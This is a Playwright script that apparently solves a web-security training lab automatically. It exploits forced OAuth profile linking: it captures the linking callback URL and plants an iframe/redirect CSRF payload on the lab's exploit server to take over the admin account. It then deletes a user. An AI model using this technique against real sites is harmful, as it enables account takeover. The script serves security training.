const { deleteCarlos, getExploitServerUrl, isSolved, labLogin, runLab, sleep, storeExploit } = require('./_common.cjs');

const TITLE = 'Forced OAuth profile linking';
const PATH = '/web-security/oauth/lab-oauth-forced-oauth-profile-linking';

async function finishProviderAuth(page, username, password) {
  const user = page.locator('input[name="username"], #username, input[type="email"]').first();
  if (await user.count()) {
    await user.fill(username);
    await page.locator('input[name="password"], #password, input[type="password"]').first().fill(password);
    await page.getByRole('button', { name: /log in|sign in|continue/i }).click().catch(async () => {
      await page.click('button[type="submit"], input[type="submit"]');
    });
  }
  const approve = page.getByRole('button', { name: /authorize|allow|continue/i });
  if (await approve.count()) {
    await approve.first().click().catch(() => {});
  }
  await page.waitForLoadState('domcontentloaded').catch(() => {});
  await page.waitForTimeout(1200);
}

async function loginProviderAccount(page, username, password) {
  const user = page.locator('input[name="username"], #username, input[type="email"]').first();
  if (!await user.count()) {
    return;
  }
  await user.fill(username);
  await page.locator('input[name="password"], #password, input[type="password"]').first().fill(password);
  await Promise.all([
    page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
    page.getByRole('button', { name: /log in|sign in|continue/i }).click().catch(async () => {
      await page.click('button[type="submit"], input[type="submit"]');
    }),
  ]);
  await page.waitForTimeout(1000);
}

async function findAttachUrl(page) {
  const href = await page.evaluate(() => {
    const links = [...document.querySelectorAll('a[href]')].map((link) => ({
      text: (link.textContent || '').replace(/\s+/g, ' ').trim(),
      href: link.href || '',
    }));

    return (
      links.find((link) => /attach a social profile/i.test(link.text))
      || links.find((link) => /oauth-server\.net\/auth/i.test(link.href) && /redirect_uri=.*oauth-linking/i.test(link.href))
      || links.find((link) => /attach|link.*social|social.*profile/i.test(link.text))
    )?.href || null;
  });
  if (!href) {
    throw new Error('Attach social profile link not found');
  }
  return href;
}

async function findSocialLoginUrl(page, labUrl) {
  await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const href = await page.evaluate(() => {
    const links = [...document.querySelectorAll('a[href]')].map((link) => ({
      text: (link.textContent || '').replace(/\s+/g, ' ').trim(),
      href: link.href || '',
    }));

    return (
      links.find((link) => /social media/i.test(link.text))
      || links.find((link) => /oauth-server\.net\/auth/i.test(link.href) && /redirect_uri=.*oauth-callback/i.test(link.href))
    )?.href || null;
  });
  if (!href) {
    throw new Error('Social login link not found');
  }
  return href;
}

async function captureLinkingCallbackViaProvider(page, labUrl) {
  const form = await page.evaluate(() => {
    const element = document.querySelector('form');
    if (!element) return null;
    return {
      action: element.action,
      method: (element.method || 'POST').toUpperCase(),
      fields: [...element.querySelectorAll('input[name]')].map((input) => [input.name, input.value]),
    };
  });
  if (!form?.action) {
    throw new Error('OAuth provider consent form not found');
  }

  let nextUrl = form.action;
  let method = form.method;
  let payload = Object.fromEntries(form.fields);

  for (let attempt = 0; attempt < 5; attempt += 1) {
    // eslint-disable-next-line no-await-in-loop
    const response = await page.context().request.fetch(nextUrl, {
      method,
      form: method === 'POST' ? payload : undefined,
      maxRedirects: 0,
      failOnStatusCode: false,
    });
    const location = response.headers().location;
    if (!location) {
      break;
    }
    const absoluteLocation = new URL(location, nextUrl).toString();
    if (absoluteLocation.startsWith(labUrl + '/oauth-linking?')) {
      return absoluteLocation;
    }
    nextUrl = absoluteLocation;
    method = 'GET';
    payload = undefined;
  }

  return '';
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    if (await isSolved(page, labUrl)) {
      return;
    }

    await labLogin(page, labUrl, 'wiener', 'peter');
    await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });

    const attachUrl = await findAttachUrl(page);
    let capturedUrl = '';

    const callbackPattern = /\/oauth-linking\?.+/;
    const requestHandler = (request) => {
      const url = request.url();
      if (!capturedUrl && url.startsWith(labUrl + '/oauth-linking?')) {
        capturedUrl = url;
      }
    };
    const routeHandler = async (route) => {
      const url = route.request().url();
      if (!capturedUrl && url.startsWith(labUrl + '/oauth-linking?')) {
        capturedUrl = url;
        await route.abort();
        return;
      }
      await route.continue();
    };

    page.on('request', requestHandler);
    await page.route(callbackPattern, routeHandler);
    try {
      await page.goto(attachUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });
      await loginProviderAccount(page, 'peter.wiener', 'hotdog');
      if (!capturedUrl && /oauth-server\.net/i.test(page.url())) {
        capturedUrl = await captureLinkingCallbackViaProvider(page, labUrl);
      }
      if (!capturedUrl) {
        const approve = page.getByRole('button', { name: /authorize|allow|continue/i });
        if (await approve.count()) {
          await approve.first().click().catch(() => {});
        }
      }
      await page.waitForTimeout(1500);
    } finally {
      page.off('request', requestHandler);
      await page.unroute(callbackPattern, routeHandler).catch(() => {});
    }

    if (!capturedUrl) {
      throw new Error('OAuth linking callback URL was not captured');
    }

    const escapedUrl = capturedUrl.replace(/"/g, '&quot;');
    const exploitUrl = await getExploitServerUrl(page, labUrl);
    await storeExploit(
      page,
      exploitUrl,
      `<iframe src="${escapedUrl}"></iframe><script>location='${capturedUrl.replace(/'/g, '%27')}'</script>`,
      true,
    );
    await sleep(10000);

    await page.goto(labUrl + '/logout', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});

    const loginUrl = await findSocialLoginUrl(page, labUrl);
    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });
    await finishProviderAuth(page, 'peter.wiener', 'hotdog');
    await deleteCarlos(page, labUrl);
  },
});
